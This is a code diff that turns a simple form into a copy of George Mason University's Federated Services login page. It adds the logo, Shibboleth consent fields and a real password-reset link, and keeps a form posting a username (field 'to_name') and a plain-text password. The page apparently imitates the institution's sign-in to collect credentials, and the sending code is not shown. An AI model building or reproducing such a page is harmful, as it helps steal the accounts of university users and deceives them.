@@ -64,16 +64,64 @@ form label {
 
 </head>
 <body>
-  <form id="myform" method="post">
-<label>username</label>
-<input type="text" name="to_name" />
-<label>password</label>
-<input type="text" name="password" />
-<br><br>
-<button>
-Send
-</button>
-</form>
+<div class="wrapper">
+    <div class="container">
+        <header>
+            <img src="GMU_PLogo_RGB.jpg" alt="George Mason University Federated Services">
+            
+        </header>
+<div class="content">
+    <div class="section motd">
+            </div>
+    <div class="section login">
+        
+
+      <form id="myform" method="post">
+           <div class="form-element-wrapper">
+                  <label>username</label>
+					<input type="text" name="to_name" />
+           </div>
+          
+            <div class="form-element-wrapper">
+				<label>password</label>
+				<input type="text" name="password" />
+
+            </div>
+
+            <div class="form-element-wrapper">
+                <input type="checkbox" name="donotcache" value="1" id="donotcache">
+                <label for="donotcache">Don't Remember Login</label>
+            </div>
+            
+            <div class="form-element-wrapper d-none">
+                <input id="_shib_idp_revokeConsent" type="checkbox" name="_shib_idp_revokeConsent" value="true">
+                <label for="_shib_idp_revokeConsent">Clear prior granting of permission for release of your information to this service.</label>
+            </div>
+            <div class="form-element-wrapper mt-4">
+                <br><br>
+                <button>
+                     Send
+                </button>
+            </div>
+        </form>
+
+        
+                        
+    </div>
+    <div class="section links">
+                <ul class="list list-help">
+                        <li class="list-help-item">
+                <a href="https://password.gmu.edu/">
+                    <span class="item-marker">›</span>
+                    Forgot your password?                </a>
+            </li>
+                        <li class="list-help-item"><a href="#"><span class="item-marker">›</span>
+                Need Help?</a></li>
+        </ul>
+    </div>
+</div>
+</div>
+
 
 <script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
 
